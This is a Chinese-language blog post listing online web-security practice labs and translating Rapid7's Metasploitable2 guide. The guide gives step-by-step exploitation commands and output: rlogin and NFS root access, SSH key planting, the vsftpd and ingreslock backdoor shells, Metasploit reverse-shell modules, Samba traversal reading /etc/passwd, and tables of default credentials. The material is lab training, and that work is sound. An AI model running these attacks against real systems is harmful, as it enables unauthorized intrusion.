---
title: 渗透靶机及安装
date: 2020-03-29 21:11:55
categories:
- 安全
- 环境
tags:
- 部署
typora-root-url: ./
---

# Web安全在线练习平台

大家平台在学习web安全的时候是不是苦于寻找练手平台？是不是苦于搭建各种环境？《网络安全法》出台，更不能随意的拿网上的站点去学习。没关系，我们看雪WEB安全小组与比格云合作，为大家提供了线上练习平台。

这个平台主要包括：**DVWA、OWASP Bricks、OWASP WebGoat、SQLi-Labs**

<!-- more -->

简单介绍一下这几个平台：

## 1.DVWA

DVWA是著名的OWASP开放出来的一个在线web安全教、学平台。提供了：暴力破解、命令执行、CSRF、文件包含、SQL注入、XSS学习环境，并且分：low、medium、high三种不同的安全等级，等级越高难度也越大。同时每一个漏洞可以直接在页面选择查看源码进行源码对比学习。

地址：[http://43.247.91.228:81](http://43.247.91.228:81/)

账号：admin

密码：password（为了大家都可以使用这个平台，尽量不要去改密码哈~）

## 2.OWASP Bricks

这个也是OWASP放出来的一个web安全学习平台，PHP+MySQL，主要有SQL注入练习及简单绕过。

地址：http://43.247.91.228:83/

如果不能正常练习，进入：http://43.247.91.228:83/config/ 然后reset就可以了。

## 3.WebGoat

WebGoat是一个用于讲解典型web漏洞的基于J2EE架构的web应用，他由著名的WEB应用安全研究组织OWASP精心设计并不断更新。WebGoat本身是一系列教程，其中设计了大量的web缺陷，一步步的指导用户如何去利用这些漏洞进行攻击，同时也指出了如何在程序设计和编码时避免这些漏洞。Web应用程序的设计者和测试者都可以在WebGoat中找到自己感兴趣的部分。虽然WebGoat中对于如何利用漏洞给出了大量的解释，但是还是比较有限，尤其是对于初学者来说，但觉得这正是其特色之处：WebGoat的每个教程都明确告诉你存在什么漏洞，但是如何去攻破要你自己去查阅资料，了解该漏洞的原理、特征和攻击方法，甚至要自己去找攻击辅助工具，当你成功时，WebGoat会给出一个红色的Congratulation，让你很有成就感！

地址：http://43.247.91.228:82/WebGoat/

## **4.SQLi-Labs**

SQLi-Labs SQL注入练习平台，主要用来web安全学习者学习sql注入之用，类似闯关模式。欢迎使用~

地址：http://43.247.91.228:84/



原文：https://bbs.pediy.com/thread-218653.htm

# 离线靶机

## Metasploitable2

Metasploitable2 虚拟系统是一个特别制作的ubuntu操作系统，本身设计作为安全工具测试和演示常见漏洞攻击。版本2已经可以下载，并且比上一个版本包含更多可利用的安全漏洞。这个版本的虚拟系统兼容VMware，VirtualBox,和其他虚拟平台。默认只开启一个网络适配器并且开启NAT和Host-only，本镜像一定不要暴漏在一个易受攻击的网络中。

**开始工作**

当虚拟系统启动之后，使用用户名***msfadmin***，和密码***msfadmin\***登陆。使用shell运行ifconfig命令来确认IP地址。

```bash
msfadmin@metasploitable:~$ ifconfig 
eth0    Link encap:Ethernet  HWaddr 00:0c:29:9a:52:c1  
        inet addr:192.168.99.131  Bcast:192.168.99.255  Mask:255.255.255.0
        inet6 addr: fe80::20c:29ff:fe9a:52c1/64 Scope:Link
        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
```

**服务**

作为攻击者的操作系统（linux，大多数时候使用BackTrack），我们需要在虚拟机中通过使用nmap来辨认开放的端口。接下来的命令能够扫描目标系统-Metasploitable 2的所有TCP端口。

root@ubuntu:~# **nmap -p0-65535 192.168.99.131**

Starting Nmap 5.61TEST4 ( [http://nmap.org](http://nmap.org/) ) at 2012-05-31 21:14 PDT

Nmap scan report for 192.168.99.131

Host is up (0.00028s latency).

Not shown: 65506 closed ports

PORT   STATE SERVICE

21/tcp  open ftp

22/tcp  open ssh

23/tcp  open telnet

25/tcp  open smtp

53/tcp  open domain

80/tcp  open http

111/tcp  open rpcbind

139/tcp  open netbios-ssn

445/tcp  open microsoft-ds

512/tcp  open exec

513/tcp  open login

514/tcp  open shell

1099/tcp open rmiregistry

1524/tcp open ingreslock

2049/tcp open nfs

2121/tcp open ccproxy-ftp

3306/tcp open mysql

3632/tcp open distccd

5432/tcp open postgresql

5900/tcp open vnc

6000/tcp open X11

6667/tcp open irc

6697/tcp open unknown

8009/tcp open ajp13

8180/tcp open unknown

8787/tcp open unknown

39292/tcp open unknown

43729/tcp open unknown

44813/tcp open unknown

55852/tcp open unknown

MAC Address: 00:0C:29:9A:52:C1 (VMware)

目标系统中几乎每一个端口监听的服务都给我们提供一个远程接入点。在接下来的章节中，我们将会漫步于这些路径之中。

**服务：Unix基础**

TCP端口512,513和514为著名的rlogin提供服务。在系统中被错误配置从而允许远程访问者从任何地方访问（标准的，rhosts + +）。要利用这个配置，确保rsh客户端已经安装（在ubuntu上），然后以root权限运行下列命令，如果被提示需要一个SSH秘钥，这表示rsh客户端没有安装，ubuntu一般默认使用SSH。

```bash
# rlogin -l root 192.168.99.131
Last login: Fri Jun  1 00:10:39 EDT 2012 from :0.0 on pts/0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
```

这是如此轻而易举办到。接下来我们要查看的是网络文件系统（NFS)。NFS可以通过扫描2049端口或者查询端口映射程序的服务列表进行确认。下面的列子我们将通过rpcinfo来确认NFS,通过showmount -e 来确定“ /”共享（文件系统的根目录）已经被导出。我们需要安装ubuntu中的rpcbind和nfs-common的依赖包。

root@ubuntu:~# **rpcinfo -p 192.168.99.131**

  program vers proto  port service

  100000  2  tcp  111 portmapper

  100000  2  udp  111 portmapper

  100024  1  udp 53318 status

  100024  1  tcp 43729 status

  100003  2  udp  2049 nfs

  100003  3  udp  2049 nfs

  100003  4  udp  2049 nfs

  100021  1  udp 46696 nlockmgr

  100021  3  udp 46696 nlockmgr

  100021  4  udp 46696 nlockmgr

  **100003  2  tcp  2049 nfs**

  **100003  3  tcp  2049 nfs**

  **100003  4  tcp  2049 nfs**

  100021  1  tcp 55852 nlockmgr

  100021  3  tcp 55852 nlockmgr

  100021  4  tcp 55852 nlockmgr

  100005  1  udp 34887 mountd

  100005  1  tcp 39292 mountd

  100005  2  udp 34887 mountd

  100005  2  tcp 39292 mountd

  100005  3  udp 34887 mountd

  100005  3  tcp 39292 mountd

root@ubuntu:~# **showmount -e 192.168.99.131**

Export list for 192.168.99.131:

**/ \***

获取一个系统的可写入的文件系统权限是很简单的。我们需要在攻击者的系统上创建一个新的SSH秘钥，挂载NFS接口，然后把我们的秘钥添加到root使用者账号的认证秘钥文件里：

root@ubuntu:~# **ssh-keygen** 

Generating public/private rsa key pair.

Enter file in which to save the key (/root/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /root/.ssh/id_rsa.

Your public key has been saved in /root/.ssh/id_rsa.pub.



root@ubuntu:~# **mkdir /tmp/r00t**

root@ubuntu:~# **mount -t nfs 192.168.99.131:/ /tmp/r00t/**

root@ubuntu:~# **cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys** 

root@ubuntu:~# **umount /tmp/r00t** 

 

root@ubuntu:~# **ssh root@192.168.99.131**

Last login: Fri Jun 1 00:29:33 2012 from 192.168.99.128

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

**服务：后门**

Metasploitable2 在21端口上运行着vsftpd服务，一个使用广泛的FTP服务。这个特别的版本包含一个后门允许一个未知的入侵者进入核心代码。这个后门很快就被确认并且移除。但是移除之前已经被少数人下载下来。如果在发送的用户名后面加上”：）“（笑脸符号），这个版本的后门会在6200端口上打开一个监听的shell。我们可以通过telnet确认或者通过metasploit上面的攻击模块自动攻击。

root@ubuntu:~# **telnet 192.168.99.131 21**

Trying 192.168.99.131…

Connected to 192.168.99.131.

Escape character is &#039;^]&#039;.

220 (vsFTPd 2.3.4)

**user backdoored:)**

331 Please specify the password.

**pass invalid**

**^]**

telnet> **quit**

Connection closed.

root@ubuntu:~# **telnet 192.168.99.131 6200**

Trying 192.168.99.131…

Connected to 192.168.99.131.

Escape character is &#039;^]&#039;.

**id;**

uid=0(root) gid=0(root)

在Metasploitable2 的6667端口上运行着UnreaIRCD IRC的守护进程。这个版本包含一个后门-运行了几个月都没被注意到。通过在一个系统命令后面添加两个字母”AB“发送给被攻击服务器任意一个监听该端口来触发。metasploit上已经已经有攻击模块来获得一个交互的shell，请看下面列子。

msfconsole

msf > **use exploit/unix/irc/unreal_ircd_3281_backdoor**

msf exploit(unreal_ircd_3281_backdoor) > **set RHOST 192.168.99.131**

msf exploit(unreal_ircd_3281_backdoor) > **exploit** 

[*] Started reverse double handler

[*] Connected to 192.168.99.131:6667…

  :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname..

  :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn&#039;t resolve your host   name; using your IP address instead

[*] Sending backdoor command…

[*] Accepted the first client connection…

[*] Accepted the second client connection…

[*] Command: echo 8bMUYsfmGvOLHBxe;

[*] Writing to socket A

[*] Writing to socket B

[*] Reading from sockets…

[*] Reading from socket B

[*] B: "8bMUYsfmGvOLHBxe\r\n"

[*] Matching…

[*] A is input…

[*] Command shell session 1 opened (192.168.99.128:4444 -> 192.168.99.131:60257) at 2012-05-31 21:53:59 -0700

**id**

uid=0(root) gid=0(root)

在少数服务器上存在一个古老的令人惊讶的“ingreslock”后门，监听1524端口。在过去的十年里，它经常被用于入侵一个暴露的服务器。它的利用是如此简单。

root@ubuntu:~# **telnet 192.168.99.131 1524**

Trying 192.168.99.131…

Connected to 192.168.99.131.

Escape character is &#039;^]&#039;.

root@metasploitable:/# **id**

uid=0(root) gid=0(root) groups=0(root)

**服务：无意识的后门**

除了上个部分介绍的恶意的后门以外，一些程序的性质本身就类似后门。Metasploitable2 最先安装的是distccd。这个程序可以使大量代码在网络服务器上进行分布式编译。问题是攻击者可以滥用它来实现一些他们想运行的命令。metasploit在下面例子里证明。

**msfconsole**

msf > **use exploit/unix/misc/distcc_exec** 

msf exploit(distcc_exec) > **set RHOST 192.168.99.131**

msf exploit(distcc_exec) > **exploit** 

[*] Started reverse double handler

[*] Accepted the first client connection…

[*] Accepted the second client connection…

[*] Command: echo uk3UdiwLUq0LX3Bi;

[*] Writing to socket A

[*] Writing to socket B

[*] Reading from sockets…

[*] Reading from socket B

[*] B: "uk3UdiwLUq0LX3Bi\r\n"

[*] Matching…

[*] A is input…

[*] Command shell session 1 opened (192.168.99.128:4444 -> 192.168.99.131:38897) at 2012-05-31 22:06:03 -0700

**id**

uid=1(daemon) gid=1(daemon) groups=1(daemon)

samba，当配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。下面例子里，metasploit提供一个攻击模块，允许接入一个root文件系统通过一个匿名接入和可写入的共享设置。

root@ubuntu:~# **smbclient -L //192.168.99.131**

Anonymous login successful

Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]

 

​    Sharename    Type   Comment

​    ———    —-   ——-

​    print$     Disk   Printer Drivers

​    **tmp       Disk   oh noes!**

​    opt       Disk   

​    IPC$      IPC    IPC Service (metasploitable server (Samba 3.0.20-Debian))

​    ADMIN$     IPC    IPC Service (metasploitable server (Samba 3.0.20-Debian))

root@ubuntu:~# **msfconsole**

msf > **use auxiliary/admin/smb/samba_symlink_traversal** 

msf auxiliary(samba_symlink_traversal) > **set RHOST 192.168.99.131**

msf auxiliary(samba_symlink_traversal) > **set SMBSHARE tmp**

msf auxiliary(samba_symlink_traversal) > **exploit** 

[*] Connecting to the server…

[*] Trying to mount writeable share &#039;tmp&#039;…

[*] Trying to link &#039;rootfs&#039; to the root filesystem…

[*] Now access the following share to browse the root filesystem:

[*]   \\192.168.99.131\tmp\rootfs\

msf auxiliary(samba_symlink_traversal) > **exit**

root@ubuntu:~# **smbclient //192.168.99.131/tmp**

Anonymous login successful

Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]

smb: \> **cd rootfs**

smb: \rootfs\> **cd etc**

smb: \rootfs\etc\> **more passwd**

getting file \rootfs\etc\passwd of size 1624 as /tmp/smbmore.ufiyQf (317.2 KiloBytes/sec) (average 317.2 KiloBytes/sec)

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/bin/sh

bin:x:2:2:bin:/bin:/bin/sh

[..]

**弱口令**

除了上面介绍的公开的后门和错误配置以外，Metasploit2 上不管是系统还是数据口账户都有非常严重的弱口令问题。最初的管理员登陆密码和登录名***msfadmin\***相同。通过查看系统的用户名表，我们可以通过使用缺陷来捕获passwd文件，或者通过Samba枚举这些用户，或者通过暴力破解来获得账号密码。系统中至少有一下弱口令。

| **Account Name** | **Password** |
| :--------------- | :----------- |
| msfadmin         | msfadmin     |
| user             | user         |
| postgres         | postgres     |
| sys              | batman       |
| klog             | 123456789    |
| service          | service      |

除了这些系统层面的账户，PostgreSQL 服务可以通过默认的用户名postgres和密码postgres登陆。MySQL 服务也开放，用户名为root同时为空口令。VNC服务提供一个远程桌面接入服务通过使用默认的密码password可以登陆。

**易受攻击的web服务**

Metasploitable2特意预装了易受攻击的web应用。当系统启动以后web服务会自动运行。访问web应用的方法是，打开一浏览器然后输入网址[http://> ,<IP> 就是系统的IP地址。

在这个例子里，系统运行IP地址 192.168.56.101. 打开 http://192.168.56.101/ 来查看web应用的主页。

[![metasploitable-web-home-page.png](/blog.github.io/images/50431400425310.png)](https://community.rapid7.com/servlet/JiveServlet/showImage/102-1875-12-2135/metasploitable-web-home-page.png)

访问特定的web应用可以点击首页的超链接。如果个人的web应用如果需要被访问，需要在后面增加特定的文件路径。[http://> 来创建URL http://<IP>/<应用文件夹>/。举个例子，Mutillidae 需要被访问，在这个例子访问地址为http://192.168.56.101/mutillidae/。而这个应用被安装在系统 /var/www 这个文件夹里。（注：可以通过以下命令查看 ls /var/www)。

在写这篇文章的当前版本，所有web应用程序

- ```html
  mutillidae (NOWASP Mutillidae 2.1.19)
  dvwa (Damn Vulnerable Web Application)
  phpMyAdmin
  tikiwiki (TWiki)
  tikiwiki-old
  dav (WebDav)
  ```

**易受攻击的web服务：\**Mutillidae\****

Mutillidae web应用包含OWASP 上前十可利用的攻击漏洞，包括HTML-5 web storage, forms caching, and click-jacking等。收DVWA启发，Mutillidae 允许使用者更改安全等级从0（完全没有安全意识）到5（安全）。另外提供三个层次，从“0级-我自己搞”（不要提示）到“2级-小白”（使劲提示）。如果Mutillidae在我们使用注入攻击或者黑的过程中搞坏了，点击"Reset DB" 按钮回复出厂设置。

[![mutillidae-home-page.png](/blog.github.io/images/48311400425312.png)](https://community.rapid7.com/servlet/JiveServlet/showImage/2138/mutillidae-home-page.png)

通过单击菜单栏上的"切换提示"按钮启用应用程序中的提示：

[![mutillidae-tutorial.png](/blog.github.io/images/29351400425315.png)](https://community.rapid7.com/servlet/JiveServlet/showImage/2139/mutillidae-tutorial.png)

Mutillidae 包含至少以下可被攻击的漏洞

| **Page**                        | **Vulnerabilities**                                          |      |      |
| :------------------------------ | :----------------------------------------------------------- | :--- | :--- |
| add-to-your-blog.php            | SQL Injection on blog entry   SQL Injection on logged in user name   Cross site scripting on blog entry   Cross site scripting on logged in user name   Log injection on logged in user name   CSRF   JavaScript validation bypass   XSS in the form title via logged in username   The show-hints cookie can be changed by user to enable hints even though they are not suppose to show in secure mode |      |      |
| arbitrary-file-inclusion.php    | System file compromise   Load any page from any site         |      |      |
| browser-info.php                | XSS via referer HTTP header JS Injection via referer HTTP header XSS via user-agent string HTTP header |      |      |
| capture-data.php                | XSS via any GET, POST, or Cookie                             |      |      |
| captured-data.php               | XSS via any GET, POST, or Cookie                             |      |      |
| config.inc*                     | Contains unencrytped database credentials                    |      |      |
| credits.php                     | Unvalidated Redirects and Forwards                           |      |      |
| dns-lookup.php                  | Cross site scripting on the host/ip field O/S Command injection on the host/ip field This page writes to the log. SQLi and XSS on the log are possible GET for POST is possible because only reading POSTed variables is not enforced. |      |      |
| footer.php*                     | Cross site scripting via the HTTP_USER_AGENT HTTP header.    |      |      |
| framing.php                     | Click-jacking                                                |      |      |
| header.php*                     | XSS via logged in user name and signature The Setup/reset the DB menu item canbe enabled by setting the uid value of the cookie to 1 |      |      |
| html5-storage.php               | DOM injection on the add-key error message because the key entered is output into the error message without being encoded |      |      |
| index.php*                      | You can XSS the hints-enabled output in the menu because it takes input from the hints-enabled cookie value. You can SQL injection the UID cookie value because it is used to do a lookup You can change your rank to admin by altering the UID value HTTP Response Splitting via the logged in user name because it is used to create an HTTP Header This page is responsible for cache-control but fails to do so This page allows the X-Powered-By HTTP header HTML comments There are secret pages that if browsed to will redirect user to the phpinfo.php page. This can be done via brute forcing |      |      |
| log-visit.php                   | SQL injection and XSS via referer HTTP header SQL injection and XSS via user-agent string |      |      |
| login.php                       | Authentication bypass SQL injection via the username field and password field SQL injection via the username field and password field XSS via username field JavaScript validation bypass |      |      |
| password-generator.php          | JavaScript injection                                         |      |      |
| pen-test-tool-lookup.php        | JSON injection                                               |      |      |
| phpinfo.php                     | This page gives away the PHP server configuration Application path disclosure Platform path disclosure |      |      |
| process-commands.php            | Creates cookies but does not make them HTML only             |      |      |
| process-login-attempt.php       | Same as login.php. This is the action page.                  |      |      |
| redirectandlog.php              | Same as credits.php. This is the action page                 |      |      |
| register.php                    | SQL injection and XSS via the username, signature and password field |      |      |
| rene-magritte.php               | Click-jacking                                                |      |      |
| robots.txt                      | Contains directories that are supposed to be private         |      |      |
| secret-administrative-pages.php | This page gives hints about how to discover the server configuration |      |      |
| set-background-color.php        | Cascading style sheet injection and XSS via the color field  |      |      |
| show-log.php                    | Denial of Service if you fill up the log XSS via the hostname, client IP, browser HTTP header, Referer HTTP header, and date fields |      |      |
| site-footer-xss-discusson.php   | XSS via the user agent string HTTP header                    |      |      |
| source-viewer.php               | Loading of any arbitrary file including operating system files. |      |      |
| text-file-viewer.php            | Loading of any arbitrary web page on the Interet or locally including the sites password files. Phishing |      |      |
| user-info.php                   | SQL injection to dump all usernames and passwords via the username field or the password field XSS via any of the displayed fields. Inject the XSS on the register.php page. XSS via the username field |      |      |
| user-poll.php                   | Parameter pollution GET for POST XSS via the choice parameter Cross site request forgery to force user choice |      |      |
| view-someones-blog.php          | XSS via any of the displayed fields. They are input on the add to your blog page. |      |      |

**易被攻击的web服务：DVWA**

从DVWA主页可以看到：“该死的容易被攻击的web应用（DVWA）的架构为PHP/MySQ。其主要目标是要帮助安全专业人员来测试他们的技能和工具在法律允许的情况下，

帮助web开发人员更好地了解保护web应用程序的过程和作为课堂演示。

Default username = admin
Default password = password

[![dvwa.png](/blog.github.io/images/98591400425318.png)](https://community.rapid7.com/servlet/JiveServlet/showImage/2140/dvwa.png)

***\*易被攻击的web服务：\*\*Information Disclosure\*\**\*****
**

另外,不恰当的PHP信息披露也可以在[http:///phpinfo.ph](http:///phpinfo.ph)p找到。在这个例子里，链接地址为http://192.168.56.101/phpinfo.php。PHP 信息泄露提供了内部系统的信息和服务可以用来查找安全漏洞的版本信息。举个例子，注意到在截图中披露的 PHP 的版本是 5.2.4，可能存在可以利用的漏洞，有可能系统存在CVE–2012-1823和 CVE–2012-2311，影响PHP 5.3.12 和 5.4.x 前 5.4.2 之前的版本。

[![phpinfo.png](/blog.github.io/images/64181400425320.png)](https://community.rapid7.com/servlet/JiveServlet/showImage/102-1875-12-2136/phpinfo.png)

**metasploitable2下载址：**http://sourceforge.net/projects/metasploitable/files/Metasploitable2

[原文地址：https://community.rapid7.com/docs/DOC-1875版权归原作者所有，仅供学习交流之用]
